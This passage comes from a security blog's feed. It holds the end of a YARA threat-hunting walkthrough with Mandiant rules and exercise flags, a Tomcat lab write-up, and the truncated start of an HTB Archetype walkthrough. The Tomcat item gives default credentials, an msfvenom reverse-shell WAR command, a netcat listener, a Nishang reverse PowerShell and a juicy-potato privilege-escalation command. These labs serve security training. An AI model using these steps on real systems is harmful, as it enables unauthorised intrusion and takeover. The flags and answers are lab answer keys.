class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$&lt;/span&gt; = &lt;span class=&quot;hex&quot;&gt;{B9 00 01 00 00 99 F7 F9 8B 44 24 [50-200] 0F B6 00 3D FF 00 00 00}&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// Key initialization&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$&lt;/span&gt; = &lt;span class=&quot;hex&quot;&gt;{0F B6 00 3D FF 00 00 00}&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// Key size&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;condition&quot;&gt;all of them&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;br&gt;&lt;span class=&quot;rulename&quot;&gt;rule M_APT_Downloader_WINELOADER_2&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;meta:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;author&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Mandiant&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;disclaimer&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;This rule is meant for hunting and is not tested to run in a production environment.&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;description&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Detects payload invocation stub in WINELOADER&quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;&lt;br&gt;      &lt;span class=&quot;comment&quot;&gt;// 48 8D 0D ?? ?? 00 00  lea rcx, module_start (Pointer to encrypted resource)&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;comment&quot;&gt;// 48 C7 C2 ?? ?? 00 00  mov rdx, ???? (size of encrypted source)&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;comment&quot;&gt;// E8 [4]  call decryption&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;comment&quot;&gt;// 48 8D 05 [4]  lea rcx, ??&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;comment&quot;&gt;// 48 8D 0D [4]  lea rax, module_start (decrypted resource)&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;comment&quot;&gt;// 48 89 05 [4]  mov ptr_mod, rax&lt;/span&gt;&lt;br&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$&lt;/span&gt; = &lt;span class=&quot;hex&quot;&gt;{48 8D 0D ?? ?? 00 00 48 C7 C2 ?? ?? 00 00 E8 [4] 48 8D 0D [4] 48 8D 05 [4] 48 89 05}&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;condition&quot;&gt;all of them&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;br&gt;&lt;span class=&quot;rulename&quot;&gt;rule M_APT_Dropper_Rootsaw_Obfuscated&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;meta:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;author&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Mandiant&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;disclaimer&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;This rule is meant for hunting and is not tested to run in a production environment.&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;description&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Detects obfuscated ROOTSAW payloads&quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;function _&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;new XMLHttpRequest();&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&apos;\x2e\x7a\x69\x70&apos;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&apos;\x4f\x70\x65\x6e&apos;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;\x43\x3a\x5c\x57&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;https://waterforvoiceless.org/util.php&quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;condition&quot;&gt;2 of them&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;Q:&lt;/b&gt; &lt;i&gt;What option do you need to pass to ensure you scan all directories recursively?&lt;/i&gt;&lt;br&gt;&lt;b&gt;A:&lt;/b&gt; &lt;i&gt;-r&lt;/i&gt;&lt;/p&gt;&lt;p&gt;When you find clear evidence of a security problem (called an Indicator of Compromise) on a system, the first thing to do is follow the steps in your company&apos;s incident response (IR) plan. A good company will have a document that explains what to do before, during, and after a security incident.&lt;/p&gt;&lt;p&gt;Your first step is usually to tell the person or team in charge of handling incidents. They will follow the plan, bring the right people together, and start working on fixing the problem.&lt;/p&gt;&lt;p&gt;The plan might include using a system like DAIR (Dynamic Approach to Incident Response) to organize the steps. You might be asked to help with tasks such as looking more closely at the affected computer, saving important evidence, disconnecting the computer from the network, and more.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/threathuntingwithyara/e339857f7cbe4837933227b7a5c02b1c.png&quot;&gt;&lt;/p&gt;&lt;p&gt;When you&apos;re threat hunting, it’s very important to write down everything you find. This information can be really helpful if there&apos;s ever an incident, and it can save time when you start responding to it. Time is very important when dealing with security problems. If you look at the Cyber Kill Chain below, documenting things early could make the difference between catching a problem in the Command and Control (C2) phase or later when the attacker has already started doing damage (Actions on Objectives phase).&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/threathuntingwithyara/89a367f72a384ac692a90544c8d473e2.png&quot;&gt;&lt;/p&gt;&lt;p&gt;Write a YARA rule to find the file that contains the pattern &lt;i&gt;&quot;THM{}&quot;&lt;/i&gt;. Use the &lt;code&gt;C:\TMP\Exercise1\&lt;/code&gt; path as the target in the YARA command, enter the flag as the answer.&lt;/p&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule exercise1&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;THM{&quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;condition&quot;&gt;$1&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;p&gt;Run as:&lt;/p&gt;&lt;pre class=&quot;powershell-code&quot;&gt;PS C:\TMP\YARARULES&gt; &lt;span class=&quot;cmdlet&quot;&gt;yara64&lt;/span&gt; .\exercise1.yara C:\TMP\Exercise1&lt;/pre&gt;&lt;br&gt;&lt;p&gt;Write a YARA rule that finds the file that contains the following strings: &lt;i&gt;&quot;Yet another&quot;&lt;/i&gt;, &quot;&lt;i&gt;Ridiculous acronym&quot;&lt;/i&gt;. Use the &lt;code&gt;C:\TMP\Exercise2\&lt;/code&gt; path as the target in the YARA command. Enter the name of the file as the answer.&lt;/p&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule exercise2&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Yet another&quot;&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;wide&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$2&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Ridiculous acronym&quot;&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;wide&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;condition&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;condition&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;condition&quot;&gt;$2&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;p&gt;Run as:&lt;/p&gt;&lt;pre class=&quot;powershell-code&quot;&gt;PS C:\TMP\YARARULES&gt; &lt;span class=&quot;cmdlet&quot;&gt;yara64&lt;/span&gt; .\exercise2.yara C:\TMP\Exercise2&lt;/pre&gt;&lt;br&gt;    &lt;p&gt;Write a YARA rule that searches for the file that contains the base64 encoded string &lt;i&gt;&quot;THM{This was a really fun exercise}&quot;&lt;/i&gt;. Use the &lt;code&gt;C:\TMP\Exercise3\&lt;/code&gt; path as the target in the YARA command, and enter name of the file as the answer.&lt;/p&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule exercise3&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;THM{This was a really fun exercise}&quot;&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;base64&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;condition&quot;&gt;$1&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;   &lt;p&gt;Run as:&lt;/p&gt;&lt;pre class=&quot;powershell-code&quot;&gt;PS C:\TMP\YARARULES&gt; &lt;span class=&quot;cmdlet&quot;&gt;yara64&lt;/span&gt; .\exercise3.yara C:\TMP\Exercise3&lt;/pre&gt;&lt;br&gt;&lt;p&gt;Write a YARA rule that searches for the XOR encrypted string &lt;i&gt;&quot;THM{FoundSomethingHidden}&quot;&lt;/i&gt; in the &lt;code&gt;C:\TMP&lt;/code&gt; directory and subdirectories. Fill in the encrypted text and XOR key used.&lt;/p&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule exercise4&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;THM{FoundSomethingHidden}&quot;&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;xor&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;condition&quot;&gt;$1&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;p&gt;Run as:&lt;/p&gt;&lt;pre class=&quot;powershell-code&quot;&gt;PS C:\TMP\YARARULES&gt; &lt;span class=&quot;cmdlet&quot;&gt;yara64&lt;/span&gt; .\exercise4.yara -X C:\TMP\Exercise4&lt;/pre&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;Q:&lt;/b&gt; &lt;i&gt;What is the flag found in exercise 1?&lt;/i&gt;&lt;br&gt;&lt;b&gt;A:&lt;/b&gt; &lt;i&gt;THM{Threathuntingisawesome}&lt;/i&gt;&lt;/P&gt;&lt;p&gt;&lt;b&gt;Q:&lt;/B&gt; &lt;i&gt;What is the filename found in exercise 2? (Format: filename.extension)&lt;/i&gt;&lt;br&gt;&lt;b&gt;A:&lt;/b&gt; &lt;i&gt;file10.txt&lt;/i&gt;&lt;/P&gt;&lt;p&gt;&lt;b&gt;Q:&lt;/B&gt; &lt;i&gt;What is the filename found in exercise 3? (Format: filename.extension)&lt;/i&gt;&lt;br&gt;&lt;b&gt;A:&lt;/b&gt; &lt;i&gt;file13.txt&lt;/i&gt;&lt;/P&gt;&lt;p&gt;&lt;b&gt;Q:&lt;/B&gt; &lt;i&gt;What was the XOR key used for encryption in exercise 4?&lt;/i&gt;&lt;br&gt;&lt;b&gt;A:&lt;/b&gt; &lt;i&gt;0x01&lt;/i&gt;&lt;/P&gt;&lt;p&gt;&lt;b&gt;Q:&lt;/B&gt; &lt;i&gt;What encrypted string did you find in exercise 4?&lt;/i&gt;&lt;br&gt;&lt;b&gt;A:&lt;/b&gt; &lt;i&gt;UILzGntoeRnlduihofIheedo|&lt;/i&gt;&lt;/P&gt;</content>
        
          <category term="medium"/>
        
          <category term="walktrough"/>
        
          <category term="threat hunting"/>
        
          <category term="blue team"/>
        
          <category term="yara"/>
        
          <category term="thm"/>
        
          <category term="investigation"/>
        
          <category term="malware"/>
        
          <category term="ioc"/>
        
          <category term="malware detection"/>
        
      </item>
    
      <item>
        <title>Tomcat</title>
        <link href="https://benwick921.github.io/cyber/writeup/tomcat/" rel="alternate" type="text/html" title="Tomcat"/>
        <guid>https://benwick921.github.io/cyber/writeup/tomcat/</guid>
        <pubDate>Thu, 27 Mar 2025 00:35:02 GMT</pubDate>
        <lastBuildDate>Thu, 27 Mar 2025 00:35:02 GMT</lastBuildDate> 
        <content type="html" xml:base="Thu, 27 Mar 2025 00:35:02 GMT">&lt;img src=&quot;/cyber/writeup/tomcat/banner.gif&quot; alt=&quot;&quot;&gt;&lt;p&gt;Enumerating &lt;em&gt;192.169.22.100/24&lt;/em&gt; to find the host running Apache with nmap &lt;code&gt;nmap -sC -sV 192.168.22.100/24&lt;/code&gt;. After the Apache scan it appears to be running on &lt;em&gt;192.168.22.150&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;Nmap scan report for 192.168.22.150&lt;br&gt;Host is up (0.042s latency).&lt;br&gt;Not shown: 991 filtered ports&lt;br&gt;PORT      STATE SERVICE            VERSION&lt;br&gt;22/tcp    open  ssh                OpenSSH for_Windows_8.1 (protocol 2.0)&lt;br&gt;| ssh-hostkey: &lt;br&gt;|   3072 6f:b4:44:da:96:20:97:54:e8:1a:9e:61:96:8f:da:95 (RSA)&lt;br&gt;|   256 87:ac:a8:b4:fa:2f:bd:e5:35:15:c1:01:5c:8d:e7:fd (ECDSA)&lt;br&gt;|_  256 aa:7b:1c:8c:1a:52:b3:40:a8:0e:47:c9:c9:e0:a5:ba (ED25519)&lt;br&gt;135/tcp   open  msrpc              Microsoft Windows RPC&lt;br&gt;139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn&lt;br&gt;445/tcp   open  microsoft-ds?&lt;br&gt;3389/tcp  open  ssl/ms-wbt-server?&lt;br&gt;| rdp-ntlm-info: &lt;br&gt;|   Target_Name: UK&lt;br&gt;|   NetBIOS_Domain_Name: UK&lt;br&gt;|   NetBIOS_Computer_Name: TOMCAT&lt;br&gt;|   DNS_Domain_Name: uk.mwr.com&lt;br&gt;|   DNS_Computer_Name: TOMCAT.uk.mwr.com&lt;br&gt;|   DNS_Tree_Name: mwr.com&lt;br&gt;|   Product_Version: 6.3.9600&lt;br&gt;|_  System_Time: 2021-06-05T13:08:40+00:00&lt;br&gt;| ssl-cert: Subject: commonName=TOMCAT.uk.mwr.com&lt;br&gt;| Not valid before: 2021-01-28T11:47:11&lt;br&gt;|_Not valid after:  2021-07-30T11:47:11&lt;br&gt;8080/tcp  open  http               Apache Tomcat 8.5.50&lt;br&gt;|_http-favicon: Apache Tomcat&lt;br&gt;|_http-open-proxy: Proxy might be redirecting requests&lt;br&gt;|_http-title: Apache Tomcat/8.5.50&lt;br&gt;49154/tcp open  msrpc              Microsoft Windows RPC&lt;br&gt;49155/tcp open  msrpc              Microsoft Windows RPC&lt;br&gt;49156/tcp open  msrpc              Microsoft Windows RPC&lt;br&gt;MAC Address: 00:15:5D:15:04:02 (Microsoft)&lt;br&gt;Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;The default credentials are &lt;b&gt;tomcat:tomcat&lt;/b&gt; which I guessed tried some common combination of username and password.&lt;/p&gt;&lt;p&gt;To be able to see under which user the Tomcat service is running I need to have access to the server. Since I have access to the Tomcat Manager page, I can upload a malicious war file to get a reverse shell.&lt;/p&gt;&lt;p&gt;To create the malicious war file, I use the following command: &lt;code&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.22.2 LPORT=4444 -f war &amp;gt; shell.war&lt;/code&gt; Where the IP is the one assigned to me at the interface Tap0 and a port of my choice.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomcat/8213f2c1eb5549339e6b0b773ce64c6e.png&quot;&gt;&lt;/p&gt;&lt;p&gt;Now I must listen to the port chosen by me (4444) waiting for the incoming connection upon uploading the malicious war file, in order to receive the conneciton I have to execute the following commands &lt;code&gt;nc -lvp 4444&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomcat/e7893a774fbb4eeea8e8b2edd5f2036e.png&quot;&gt;&lt;/p&gt;&lt;p&gt;From the Tomcat manager page, I must upload the malicious war file created.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomcat/64642cbd358b4f7cb7605045a0803267.png&quot;&gt;&lt;/p&gt;&lt;p&gt;To get a connection I must navigate to the path where the file was uploaded by clicking the link or writing the URL in the browser. In this way the malicious code inside the war file will be executed and it will try to connec to the given IP and PORT.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomcat/fdfaa8c703c04b1ea4d5db63fefca8cb.png&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomcat/2c61db120a9443f4bc3b02d350aea0d9.png&quot;&gt;&lt;/p&gt;&lt;p&gt;At this point, I have a connection and I am given a shell.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomcat/83059155708a4a9a8477ba957ec456f0.png&quot;&gt;&lt;/p&gt;&lt;p&gt;Now finally I can check under which user the service Tomcat is running. To see the list of processes I ran the command &lt;code&gt;tasklist /V&lt;/code&gt;, and the Tomcat service appears to be run by &lt;em&gt;AUTHORITY\LOCAL SERVICE&lt;/em&gt; which does not have elevated privilege.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomcat/9d804782f597427d9f3b13652f9eeddb.png&quot;&gt;&lt;/p&gt;&lt;p&gt;After searching for a misconfiguration I found that &lt;em&gt;SeImpersonatePrivilege&lt;/em&gt; is enabled by russing &lt;code&gt;whoami /all&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomcat/661371e0a3c34651a8c5fdc3dfb5a78c.png&quot;&gt;&lt;/p&gt;&lt;p&gt;So now I can try some tools to gain privileged access to the box.&lt;/p&gt;&lt;p&gt;In order to read the flag.txt file I had to privilege escalation since the normal shell did not  me to read it and did not have the permissions. To do privilege escalation I used a tool called &lt;em&gt;juicy-potato&lt;/em&gt;. Before running this tool, I had to prepare a reverse PowerShell and a Nihsang shell obtained from &lt;a data-from-md title=&apos;https://github.com/samratashok/nishang&apos; href=&apos;https://github.com/samratashok/nishang&apos;&gt;GitHub&lt;/a&gt;. The shell in question is called &lt;em&gt;Invoke-PowerShellTcp.ps1&lt;/em&gt; to which I set the parameters as follows.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomcat/a32de62d8bc54dc092fb5c4e2b4a5b29.png&quot;&gt;&lt;/p&gt;&lt;p&gt;The IP address is the IP address assigned to my tap0 interface while the port is my choice.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomcat/0adcf3fa59074225a5dde9f087010cb6.png&quot;&gt;&lt;/p&gt;&lt;p&gt;Also, I have prepared a bat file that runs the reverse PowerShell in the following way: &lt;code&gt;powershell.exe -ExecutionPolicy Unrestricted -Command &amp;quot;C:\Users\Public\Downloads\rev.ps1&amp;quot;&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomcat/96016da9af7a4da8a4b3f8d8130e72d5.png&quot;&gt;&lt;/p&gt;&lt;p&gt;Remember to use an absolute path otherwise, it might not work! Then I uploaded the juicy-potato, reverse PowerShell and the bat file to the server via the Python webserver.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomcat/3632eb85dedf4edc9a06dcf2933aafbb.png&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomcat/fcfafd6879ba43d6b046a8d9c2daca90.png&quot;&gt;&lt;/p&gt;&lt;p&gt;After obtaining all the three necessary elements, I used juicy-potato (renamed as j.exe) to create an elevated process that reconnected to my listening netcat in order to obtain a privileged reverse shell. &lt;code&gt;j.exe -t * -p C:\Users\Public\Downloads\rev.bat -l 9001&lt;/code&gt; Note that here port 9001 doesn&apos;t matter so I can put whatever I want&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomcat/813cc540a1c448ac85eee6695ce28b79.png&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomcat/18d8f9083d0f4719b72d0b21b032e1dc.png&quot;&gt;&lt;/p&gt;</content>
        
          <category term="easy"/>
        
          <category term="ctf"/>
        
          <category term="box"/>
        
          <category term="htb"/>
        
          <category term="web"/>
        
          <category term="cms"/>
        
          <category term="powershell"/>
        
          <category term="iwr"/>
        
          <category term="python webserver"/>
        
          <category term="apache 2.4.43"/>
        
          <category term="chisel"/>
        
          <category term="cloudme 1.11.2"/>
        
          <category term="curl"/>
        
          <category term="download file"/>
        
          <category term="nsfvenom"/>
        
          <category term="port forwarding"/>
        
          <category term="powershell iwr"/>
        
          <category term="windows"/>
        
          <category term="winpeas"/>
        
          <category term="Gym Manager 1.0"/>
        
          <category term="privesc"/>
        
      </item>
    
      <item>
        <title>Archetype</title>
        <link href="https://benwick921.github.io/cyber/writeup/archetype/" rel="alternate" type="text/html" title="Archetype"/>
        <guid>https://benwick921.github.io/cyber/writeup/archetype/</guid>
        <pubDate>Thu, 27 Mar 2025 00:35:02 GMT</pubDate>
        <lastBuildDate>Thu, 27 Mar 2025 00:35:02 GMT</lastBuildDate> 
        <content type="html" xml:base="Thu, 27 Mar 2025 00:35:02 GMT">&lt;img src=&quot;/cyber/writeup/archetype/banner.gif&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;pre&gt;# Nmap 7.80 scan initiated Fri Jun 18 02:52:56 2021 as: nmap -sC -sV -oA nmap/nmap 10.10.10.27&lt;br&gt;Nmap scan report for 10.10.10.27&lt;br&gt;Host is up (0.048s latency).&lt;br&gt;Not shown: 996 closed ports&lt;br&gt;PORT     STATE SERVICE      VERSION&lt;br&gt;135/tcp  open  msrpc        Microsoft Windows RPC&lt;br&gt;139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn&lt;br&gt;445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds&lt;br&gt;1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM&lt;br&gt;| ms-sql-ntlm-info: &lt;br&gt;|   Target_Name: ARCHETYPE&lt;br&gt;|   NetBIOS_Domain_Name: ARCHETYPE&lt;br&gt;|   NetBIOS_Computer_Name: ARCHETYPE&lt;br&gt;|   DNS_Domain_Name: Archetype&lt;br&gt;|   DNS_Computer_Name: Archetype&lt;br&gt;|_  Product_Version: 10.0.17763&lt;br&gt;| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback&lt;br&gt;| Not valid before: 2021-06-18T07:06:04&lt;br&gt;|_Not valid after:  2051-06-18T07:06:04&lt;br&gt;|_ssl-date: 2021-06-18T07:11:38+00:00; +18m24s from scanner time.&lt;br&gt;Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows&lt;br&gt;&lt;br&gt;Host script results:&lt;br&gt;|_clock-skew: mean: 1h42m23s, deviation: 3h07m50s, median: 18m23s&lt;br&gt;| ms-sql-info: &lt;br&gt;|   10.10.10.27:1433: &lt;br&gt;|     Version: &lt;br&gt;|       name: Microsoft SQL Server 2017 RTM&lt;br&gt;|       number: 14.00.1000.00&lt;br&gt;|       Product: Microsoft SQL Server 2017&lt;br&gt;|       Service pack level: RTM&lt;br&gt;|       Post-SP patches applied: false&lt;br&gt;|_    TCP port: 1433&lt;br&gt;| smb-os-discovery: &lt;br&gt;|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)&lt;br&gt;|   Computer name: Archetype&lt;br&gt;|   NetBIOS computer name: ARCHETYPE\x00&lt;br&gt;|   Workgroup: WORKGROUP\x00                                                                                        &lt;br&gt;|_  System time: 2021-06-18T00:11:29-07:00                                  &lt;br&gt;| smb-security-mode:                          &lt;br&gt;|   account_used: guest                                                                                             &lt;br&gt;|   authentication_level: user                                                                                      &lt;br&gt;|   challenge_response: supported                                                                                   &lt;br&gt;|_  message_signing: disabled (dangerous, but default)                                                              &lt;br&gt;| smb2-security-mode:                                                                                               &lt;br&gt;|   2.02:                                                                                                           &lt;br&gt;|_    Message signing enabled but not required&lt;br&gt;| smb2-time: &lt;br&gt;|   date: 2021-06-18T07:11:30&lt;br&gt;|_  start_date: N/A&lt;br&gt;&lt;br&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;br&gt;# Nmap done at Fri Jun 18 02:53:14 2021 -- 1 IP address (1 host up) scanned in 18.46 seconds&lt;br&gt;&lt;/pre&gt;&lt;br&gt;&lt;p&gt;There are various ways to list the shares that I have seen in the various IppSec videos but in this specific case, the following command is the only one that worked.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ smbclient -N -L \\10.10.10.27&lt;br&gt;&lt;br&gt;        Sharename       Type      Comment&lt;br&gt;        ---------       ----      -------&lt;br&gt;        ADMIN$          Disk      Remote Admin&lt;br&gt;        backups         Disk      &lt;br&gt;        C$              Disk      Default share&lt;br&gt;        IPC$            IPC       Remote IPC&lt;br&gt;SMB1 disabled -- no workgroup available&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;i&gt;smbclient&lt;i&gt; doesn&apos;t tell if a share is read-only or read/write. To get that information I use &lt;i&gt;crackmapexec&lt;i&gt;.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ crackmapexec smb 10.10.10.27 --shares -u &apos;benwick&apos; -p &apos;&apos;&lt;br&gt;SMB         10.10.10.27     445    ARCHETYPE        [*] Windows Server 2019 Standard 17763 (name:ARCHETYPE) (domain:Archetype) (signing:False) (SMBv1:True)&lt;br&gt;SMB         10.10.10.27     445    ARCHETYPE        [+] Archetype\benwick: &lt;br&gt;SMB         10.10.10.27     445    ARCHETYPE        [+] Enumerated shares&lt;br&gt;SMB         10.10.10.27     445    ARCHETYPE        Share           Permissions     Remark&lt;br&gt;SMB         10.10.10.27     445    ARCHETYPE        -----           -----------     ------&lt;br&gt;SMB         10.10.10.27     445    ARCHETYPE        ADMIN$                          Remote Admin&lt;br&gt;SMB         10.10.10.27     445    ARCHETYPE        backups         READ            &lt;br&gt;SMB         10.10.10.27     445    ARCHETYPE        C$                              Default share&lt;br&gt;SMB         10.10.10.27     445    ARCHETYPE        IPC$                            Remote IPC&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;With &lt;i&gt;crackmapexec&lt;/i&gt; I have to specify a user and at least a blank password otherwise with the blank user for NULL authentication it doesn&apos;t work.&lt;/p&gt;&lt;p&gt;From the previous step, the only share accessible for reading is &lt;b&gt;backups&lt;b&gt;.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ smbclient &apos;\10.10.10.27\backups&apos;&lt;br&gt;Enter WORKGROUP\kali&apos;s password: &lt;br&gt;Try &quot;help&quot; to get a list of possible commands.&lt;br&gt;smb: \&gt; ls&lt;br&gt;  .                                   D        0  Mon Jan 20 07:20:57 2020&lt;br&gt;  ..                                  D        0  Mon Jan 20 07:20:57 2020&lt;br&gt;  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020&lt;br&gt;&lt;br&gt;                10328063 blocks of size 4096. 8258523 blocks available&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;By listing the current directory you will find a configuration file.&lt;/p&gt;&lt;p&gt;Since I couldn&apos;t read the configuration file I downloaded it to my host with the &lt;code&gt;get [remote-file-name] [local-file-name]&lt;/code&gt; command.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;smb: \&gt; get prod.dtsConfig conf&lt;br&gt;getting file \prod.dtsConfig of size 609 as conf (3.2 